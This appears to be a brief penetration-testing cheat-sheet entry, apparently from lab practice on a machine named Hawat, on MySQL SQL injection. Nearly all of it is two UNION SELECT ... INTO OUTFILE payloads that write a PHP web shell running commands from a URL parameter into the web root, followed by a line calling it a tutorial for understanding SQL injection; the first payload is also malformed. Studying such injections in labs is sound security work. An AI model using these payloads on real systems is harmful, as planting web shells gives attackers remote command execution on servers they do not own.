## MySQL
**If the database is mysql, try to dump all login info to files?**

#### Write to file
From the **Hawat** PG machine


```bash
UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php'

```

Other example:
```sql
union all select "<?php echo shell_exec($_GET['cmd']);?>",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php'
```

This tutorial was created to help understand SQL Injection, and describes how it works.
